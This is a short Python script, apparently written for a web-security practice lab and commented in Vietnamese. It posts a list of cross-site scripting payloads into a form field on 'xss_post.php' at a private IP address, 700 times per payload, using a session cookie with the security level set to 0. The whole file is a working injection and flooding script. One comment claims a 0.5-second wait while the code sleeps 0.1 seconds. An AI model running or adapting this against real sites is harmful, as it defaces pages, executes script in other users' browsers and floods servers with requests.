import requests
import time

# URL gốc
url = "http://192.168.10.10/xss_post.php"

# Danh sách các payload tấn công XSS
payloads = [
    '<h1 style="color:red;">This is a Hacked Title!</h1>',
    '<img src="#" onmouseover="alert(\'XSS via onmouseover\')">',
    '<button onclick="alert(\'Button Clicked!\')">Click Me!</button>',
    '<script>document.body.innerHTML = "<h1>Page Hacked by XSS</h1>";</script>',
    '<script>document.write(\'Hacked via DOM-based XSS\')</script>'
]

# Số lượng request cần thực hiện
num_requests = 700

# Cookie cần gửi
cookies = {
    'security_level': '0',
    'PHPSESSID': 'hsgaj3d1fdmnp9mhgq0h7410e7'  # Thay PHPSESSID bằng giá trị thực tế
}

# Hàm thực hiện request
def send_xss_requests():
    for i in range(num_requests):
        for payload in payloads:
            # Dữ liệu POST gửi lên
            data = {
                'firstname': payload,
                'lastname': 'hello',  # Có thể thay đổi nếu cần
                'form': 'submit'
            }

            # Gửi request POST kèm theo cookies
            response = requests.post(url, data=data, cookies=cookies)

            # Kiểm tra kết quả trả về
            if response.status_code == 200:
                print(f"Request {i+1}: Thành công")
            else:
                print(f"Request {i+1}: Thất bại")

            # Chờ 0.5 giây trước khi thực hiện request tiếp theo
            time.sleep(0.1)

# Thực hiện request
send_xss_requests()
